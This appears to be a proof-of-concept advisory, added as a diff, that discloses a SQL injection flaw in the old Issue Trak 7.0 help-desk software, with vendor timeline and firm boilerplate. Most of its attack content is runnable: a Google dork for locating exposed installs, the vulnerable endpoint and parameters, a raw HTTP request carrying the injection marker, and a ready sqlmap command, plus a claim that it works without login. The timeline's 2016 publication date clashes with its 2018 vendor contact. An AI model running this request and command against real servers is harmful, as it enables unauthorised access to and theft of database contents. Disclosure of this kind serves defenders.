@@ -1,0 +1,71 @@
+================
+Exploit Title: SQL Injection Vulnerability in Issue Trak <= 7.0 (Possibly applicable up to version 9.7)
+Date: 05-28-2018
+Vendor Homepage: http://issuetrak.com
+Version: Confirmed 7.0; <= 7.0 extremely likely; up to 9.7 very likely
+Google Dork: inurl:"IssueTrak" inurl:"asp"
+Discovered By: Chris Anastasio
+================
+
+
+Vulnerable Endpoint
+===================
+www.example.com/IssueTrak/IssueSearch_Process.asp
+
+
+
+Vulnerable Parameters
+=====================
+Status
+Priority
+inp_IssueType
+SubmittedBy
+EnteredBy
+AssignedTo
+AssignedBy
+NextActionBy
+ClosedBy
+ProjectManager
+inp_OrgID
+
+
+
+Raw HTTP Request
+===========================
+POST /IssueTrak/IssueSearch_Process.asp HTTP/1.1
+Host: example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 905
+
+TestField=dummy&Mode=&Deleted=false&ReportID=x&Status=*&SubstatusID=&Priority=&inp_IssueType=&HiddenSubtype=&HiddenSubtype2=&inp_IssueSubTypeMem=-1&SearchAll=fds&Subject=&NoteText=&Solution=&UserDef1=&CSOneID=&CSTwoID=&UserDef3=&CSThreeID=&UserDef4=&CSFourID=&SubmittedBy=&EnteredBy=&AssignedTo=&EverAssignedTo=&AssignedBy=&NextActionBy=&ClosedBy=&ProjectManager=&inp_OrgID=&OrganizationIssues=&TaskAssignedTo=&method_TargetDate=&start_TargetDate=&end_TargetDate=&method_DateOpened=&start_DateOpened=&end_DateOpened=&method_DateClosed=&start_DateClosed=&end_DateClosed=&TimeOpen=&TimeOpenDays=More&AdjTimeOpen=&AdjTimeOpenDays=More&Hours=&TimeOpenHours=More&TaskDescription=&TaskAssignedToName=&method_TaskDateCompleted=&start_TaskDateCompleted=&end_TaskDateCompleted=&Title=&OutputOptions=BriefList&ShowCriteria=on&SortOn1=&SortOrder1=Asc&SortOn2=&SortOrder2=Asc&SortOn3=&SortOrder3=Asc
+
+
+
+SQLMap command
+==============
+sqlmap -r issueTrakSearchReq.txt --dbms=mssql --level=5 --batch
+Notes: 
+	- "issueTrakSearchReq.txt" should be a plain text file containing the raw HTTP request shown above. 
+	- The "Host" header of the HTTP request should be updated with an IP address that hosts an IssueTrak 7.0 installation.
+
+	
+	
+Notes
+=====
+- A SQL injection vulnerability has been identified in IssueTrak 7.0 which, if successfully exploited, could allow an attacker to access sensitive information in the database. 
+- Authentication is generally required in order to hit this endpoint. If a non SQL injection request is made the reuslt is a redirect to the login page. However, it seems that on the back end, this request touches the database even without authentication, making it exploitable from a pre-authentication vantage point.
+- IssueTrak 7.0 was released in 2006
+
+
+
+Timeline
+========
+2018-05-18: Initial vendor contact
+2018-05-21: Vendor implies that this version of IssueTrak is no longer supported. Also states that releases starting with 9.7 the application does not suffer from thsi vulnerability
+2016-05-28: PoC details published
+
+
+
+About Illumant
+==============
+Illumant has conducted thousands of security assessment and compliance engagements, helping over 800 clients protect themselves from cyber-attacks.  Through meticulous manual analysis, Illumant helps companies navigate the security and threat landscape to become more secure, less of a target, and more compliant.  For more information, visit https://illumant.com/
